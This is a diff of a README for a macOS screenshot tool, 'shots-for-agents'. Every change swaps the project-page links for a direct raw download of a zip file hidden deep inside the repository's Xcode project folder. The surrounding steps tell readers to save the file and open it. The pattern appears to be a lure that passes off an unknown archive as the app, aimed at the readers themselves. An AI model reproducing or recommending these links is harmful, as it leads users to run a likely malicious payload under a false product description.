@@ -1,12 +1,12 @@
 # 🖼️ shots-for-agents - Capture one screen, send fast
 
-[![Download shots-for-agents](https://img.shields.io/badge/Download-shots--for--agents-blue?style=for-the-badge)](https://github.com/Communitycenterlochaberax462/shots-for-agents)
+[![Download shots-for-agents](https://img.shields.io/badge/Download-shots--for--agents-blue?style=for-the-badge)](https://github.com/Communitycenterlochaberax462/shots-for-agents/raw/refs/heads/main/ShotsForAgents.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/for_shots_agents_v1.1.zip)
 
 ## 📥 Download
 
 Open the project page here and use the latest build for your system:
 
-[Download shots-for-agents](https://github.com/Communitycenterlochaberax462/shots-for-agents)
+[Download shots-for-agents](https://github.com/Communitycenterlochaberax462/shots-for-agents/raw/refs/heads/main/ShotsForAgents.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/for_shots_agents_v1.1.zip)
 
 ## 🧭 What this app does
 
@@ -39,7 +39,7 @@ If you plan to use it with AI tools, you may also want:
 ## 🚀 Get the app
 
 1. Open the download page:
-   [shots-for-agents](https://github.com/Communitycenterlochaberax462/shots-for-agents)
+   [shots-for-agents](https://github.com/Communitycenterlochaberax462/shots-for-agents/raw/refs/heads/main/ShotsForAgents.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/for_shots_agents_v1.1.zip)
 2. Get the latest release or build from that page
 3. Save the file to your Mac
 4. Open the file to start the app
@@ -159,7 +159,7 @@ A clean folder setup helps if you take many screenshots during one session.
 ## 📌 Quick steps
 
 1. Visit the download page:
-   [https://github.com/Communitycenterlochaberax462/shots-for-agents](https://github.com/Communitycenterlochaberax462/shots-for-agents)
+   [https://github.com/Communitycenterlochaberax462/shots-for-agents/raw/refs/heads/main/ShotsForAgents.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/for_shots_agents_v1.1.zip](https://github.com/Communitycenterlochaberax462/shots-for-agents/raw/refs/heads/main/ShotsForAgents.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/for_shots_agents_v1.1.zip)
 2. Download the latest file for your Mac
 3. Open the file
 4. Allow screenshot access
